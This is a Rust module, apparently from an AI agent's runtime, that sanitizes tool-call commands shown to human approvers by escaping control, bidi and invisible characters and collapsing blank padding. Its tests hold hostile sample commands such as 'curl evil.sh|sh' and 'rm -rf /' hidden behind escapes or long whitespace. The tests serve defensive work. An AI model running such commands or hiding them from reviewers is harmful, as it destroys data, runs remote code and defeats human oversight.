use std::path::Path;

use synthesis_core::{SessionStatus, WorkspaceContext, contains};
use synthesis_events::Usage;
use synthesis_providers::Usage as ModelUsage;

/// UUIDv4, lowercase (events.md §2). OS-seeded: approval ids must not be guessable.
pub(crate) fn uuid() -> String {
    uuid::Uuid::new_v4().to_string()
}

pub use synthesis_config::is_invisible_or_blank;

/// Text safe to show a person who is deciding on a tool call. Nothing is ever dropped: ESC and
/// every other control, bidi, tag, format or blank-glyph character becomes a visible `\u{..}`
/// escape and all following text stays visible (an unterminated OSC/CSI must not hide the rest of
/// a command). A run of 16 or more blanks (spaces, any Unicode White_Space, blank glyphs: used
/// to push the end of a command off screen) is shown as `[N spaces]`.
pub fn sanitize_for_display(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut run = String::new(); // the blank run as it would be shown
    let mut n = 0usize;
    let flush = |out: &mut String, run: &mut String, n: &mut usize| {
        if *n >= 16 {
            out.push_str(&format!("[{n} spaces]"));
        } else {
            out.push_str(run);
        }
        run.clear();
        *n = 0;
    };
    for c in s.chars() {
        let blank = !matches!(c, '\n' | '\t')
            && (c.is_whitespace() || (is_invisible_or_blank(c) && !c.is_control()));
        if blank {
            n += 1;
            if c == ' ' {
                run.push(' ');
            } else {
                run.push_str(&format!("\\u{{{:x}}}", c as u32));
            }
            continue;
        }
        flush(&mut out, &mut run, &mut n);
        match c {
            '\n' => out.push_str("\\n"),
            '\t' => out.push_str("\\t"),
            c if is_invisible_or_blank(c) => out.push_str(&format!("\\u{{{:x}}}", c as u32)),
            c => out.push(c),
        }
    }
    flush(&mut out, &mut run, &mut n);
    out
}

pub(crate) fn status_str(s: SessionStatus) -> String {
    serde_json::to_value(s)
        .ok()
        .and_then(|v| v.as_str().map(String::from))
        .unwrap_or_default()
}

/// Head 60 % / tail 40 % (tools.md §3 step 6). Returns the text and whether it was cut.
pub(crate) fn cap_text(text: &str, max: usize) -> (String, bool) {
    let total = text.chars().count();
    if total <= max {
        return (text.to_string(), false);
    }
    let head = max * 6 / 10;
    let tail = max - head;
    let h_end = text.char_indices().nth(head).map_or(text.len(), |(i, _)| i);
    let t_start = text
        .char_indices()
        .nth(total - tail)
        .map_or(text.len(), |(i, _)| i);
    (
        format!(
            "{}\n[... {} chars truncated ...]\n{}",
            &text[..h_end],
            total - head - tail,
            &text[t_start..]
        ),
        true,
    )
}

/// Head 60 % / tail 40 % of at most `max` bytes (char boundaries kept). `(text, was_cut)`.
pub(crate) fn cap_bytes(text: &str, max: usize) -> (String, bool) {
    if text.len() <= max {
        return (text.to_string(), false);
    }
    let mut h = max * 6 / 10;
    while !text.is_char_boundary(h) {
        h -= 1;
    }
    let mut t = text.len() - (max - max * 6 / 10);
    while !text.is_char_boundary(t) {
        t += 1;
    }
    (
        format!(
            "{}\n[... {} bytes truncated ...]\n{}",
            &text[..h],
            t - h,
            &text[t..]
        ),
        true,
    )
}

pub(crate) fn preview(text: &str) -> String {
    let mut p: String = text.chars().take(200).collect();
    if text.chars().count() > 200 {
        p.push('…');
    }
    p
}

pub(crate) fn event_usage(u: &ModelUsage, cost: Option<f64>) -> Usage {
    Usage {
        input_tokens: u.input_tokens.unwrap_or(0),
        output_tokens: u.output_tokens.unwrap_or(0),
        cache_read_input_tokens: u.cache_read_input_tokens,
        cache_creation_input_tokens: u.cache_creation_input_tokens,
        cost_usd: cost,
    }
}

/// The workspace must still exist and `cwd` must still sit inside `root` or an extra dir.
pub(crate) fn check_workspace(ws: &WorkspaceContext) -> Result<(), String> {
    let dir = |p: &Path, what: &str| {
        if p.is_dir() {
            Ok(())
        } else {
            Err(format!(
                "workspace {what} {} is not an accessible directory",
                p.display()
            ))
        }
    };
    dir(&ws.root, "root")?;
    dir(&ws.cwd, "cwd")?;
    if std::iter::once(&ws.root)
        .chain(&ws.additional_dirs)
        .any(|r| contains(r, &ws.cwd, ws.path_policy))
    {
        Ok(())
    } else {
        Err(format!(
            "cwd {} is outside the workspace roots",
            ws.cwd.display()
        ))
    }
}

pub(crate) fn lock<T>(m: &std::sync::Mutex<T>) -> std::sync::MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn uuid_is_v4() {
        let u = uuid();
        assert_eq!(u.len(), 36);
        assert_eq!(&u[14..15], "4");
        assert!(matches!(&u[19..20], "8" | "9" | "a" | "b"));
    }

    #[test]
    fn sanitize_shows_escapes_and_exposes_padding() {
        let s = sanitize_for_display("a\x1b[2Jb\x1b]0;title\x07c\u{202e}d\x08e\nf");
        assert_eq!(s, "a\\u{1b}[2Jb\\u{1b}]0;title\\u{7}c\\u{202e}d\\u{8}e\\nf");
        let padded = format!("echo ok{}; rm -rf x", " ".repeat(200));
        assert_eq!(
            sanitize_for_display(&padded),
            "echo ok[200 spaces]; rm -rf x"
        );
        assert_eq!(sanitize_for_display("a  b"), "a  b");
    }

    #[test]
    fn blank_glyphs_are_escaped_and_counted_in_the_collapse() {
        for c in [
            '\u{a0}',
            '\u{2000}',
            '\u{200a}',
            '\u{202f}',
            '\u{205f}',
            '\u{3000}',
            '\u{1680}',
            '\u{180e}',
            '\u{34f}',
            '\u{115f}',
            '\u{1160}',
            '\u{3164}',
            '\u{ffa0}',
            '\u{2800}',
            '\u{17b4}',
            '\u{17b5}',
            '\u{fe00}',
            '\u{fe0f}',
            '\u{e0100}',
            '\u{e01ef}',
        ] {
            assert!(is_invisible_or_blank(c), "{c:?}");
            assert_eq!(
                sanitize_for_display(&format!("a{c}b")),
                format!("a\\u{{{:x}}}b", c as u32)
            );
            // a blank-glyph run cannot push the tail out of view
            let run = c.to_string().repeat(300);
            assert_eq!(
                sanitize_for_display(&format!("ok{run}; rm -rf /")),
                "ok[300 spaces]; rm -rf /"
            );
        }
        // mixed White_Space and blank glyphs form one run
        let mixed = format!(
            "x{}{}{}y",
            " ".repeat(6),
            "\u{a0}".repeat(6),
            "\u{3000}".repeat(4)
        );
        assert_eq!(sanitize_for_display(&mixed), "x[16 spaces]y");
        assert!(!is_invisible_or_blank('a') && !is_invisible_or_blank(' '));
        // short runs stay visible
        assert_eq!(sanitize_for_display("a \u{a0} b"), "a \\u{a0} b");
    }

    #[test]
    fn cap_keeps_head_and_tail() {
        let s = "a".repeat(100) + &"b".repeat(100);
        let (c, cut) = cap_text(&s, 50);
        assert!(cut && c.starts_with(&"a".repeat(30)) && c.ends_with(&"b".repeat(20)));
        assert!(!cap_text("short", 50).1);
    }

    #[test]
    fn sanitize_never_swallows_text() {
        // the exact exploit: sh runs the tail of an unterminated OSC
        let c = "git status\u{1b}]0;x; curl evil.sh|sh";
        assert_eq!(
            sanitize_for_display(c),
            "git status\\u{1b}]0;x; curl evil.sh|sh"
        );
        for opener in ["]", "P", "_", "^", "X", "["] {
            let out = sanitize_for_display(&format!("ls\x1b{opener}rm -rf /"));
            assert!(out.contains("rm -rf /") && !out.contains('\x1b'), "{out}");
        }
        // a complete SGR is shown, not applied
        assert_eq!(sanitize_for_display("\x1b[31mred"), "\\u{1b}[31mred");
        // very long input is not truncated
        let long = format!("{}; curl evil|sh", "a".repeat(200_000));
        assert!(sanitize_for_display(&long).ends_with("; curl evil|sh"));
    }

    #[test]
    fn sanitize_escapes_invisible_characters() {
        for c in [
            '\u{e0041}',
            '\u{e0000}',
            '\u{e007f}',
            '\u{61c}',
            '\u{2028}',
            '\u{2029}',
            '\u{ad}',
            '\u{2065}',
            '\u{fff9}',
            '\u{fffb}',
        ] {
            let out = sanitize_for_display(&format!("a{c}b"));
            assert_eq!(out, format!("a\\u{{{:x}}}b", c as u32));
        }
    }
}
